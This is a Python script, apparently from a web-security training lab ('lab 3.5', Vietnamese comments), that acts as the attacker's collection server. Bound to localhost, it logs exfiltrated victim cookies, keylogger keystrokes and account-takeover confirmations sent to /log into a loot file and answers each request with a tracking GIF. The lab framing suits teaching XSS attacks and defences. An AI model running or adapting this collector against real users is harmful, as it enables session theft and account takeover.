#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Server ke tan cong cho lab 3.5. Lang nghe 127.0.0.1:8037.
Mo phong "python -m http.server" nhung co ghi log: moi request toi /log?t=...&d=...
deu duoc ghi vao loot.txt (va in ra man hinh).

Cac loai du lieu nhan ve:
  t=cookie   -> cookie/session nan nhan
  t=key      -> phim nan nhan go (keylogger)
  t=takeover -> xac nhan da doi email nan nhan thanh cong
"""
import os
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote

PORT = 8037
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot.txt")

GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
       b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
       b"\x00\x00\x02\x02D\x01\x00;")


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/log":
            qs = parse_qs(parsed.query)
            t = unquote(qs.get("t", [""])[0])
            d = unquote(qs.get("d", [""])[0])
            line = "[{ts}] type={t:<9} data={d}".format(
                ts=datetime.datetime.utcnow().isoformat() + "Z", t=t, d=d)
            with open(LOOT, "a", encoding="utf-8") as f:
                f.write(line + "\n")
            print("[attacker] " + line, flush=True)
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(GIF)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    if os.path.exists(LOOT):
        os.remove(LOOT)
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    print("[attacker] lang nghe http://127.0.0.1:{}/log -> {}".format(PORT, LOOT), flush=True)
    srv.serve_forever()
